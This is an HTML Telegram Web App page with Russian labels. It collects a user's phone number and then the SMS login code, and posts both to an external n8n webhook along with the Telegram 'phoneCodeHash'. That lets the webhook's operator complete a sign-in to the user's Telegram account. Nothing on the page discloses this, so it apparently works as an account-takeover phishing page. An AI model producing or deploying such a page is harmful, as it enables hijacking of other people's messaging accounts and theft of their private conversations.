<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div id="step1">
        <input type="text" id="phone" placeholder="+79990000000">
        <button onclick="sendPhone()">Отправить номер</button>
    </div>
    <div id="step2" style="display:none;">
        <input type="text" id="code" placeholder="Код из SMS">
        <button onclick="sendCode()">Войти</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        let phoneCodeHash = "";

        async function sendPhone() {
            const phone = document.getElementById('phone').value;
            const res = await fetch('https://n8n.oxyn8n.su/webhook/auth', {
                method: 'POST',
                body: JSON.stringify({ action: 'sendPhone', phone })
            });
            const data = await res.json();
            phoneCodeHash = data.phoneCodeHash; // Придет от n8n
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }

        async function sendCode() {
            const code = document.getElementById('code').value;
            await fetch('https://n8n.oxyn8n.su/webhook/auth', {
                method: 'POST',
                body: JSON.stringify({ action: 'sendCode', code, phoneCodeHash })
            });
            alert("Авторизация прошла!");
        }
    </script>
</body>
</html>
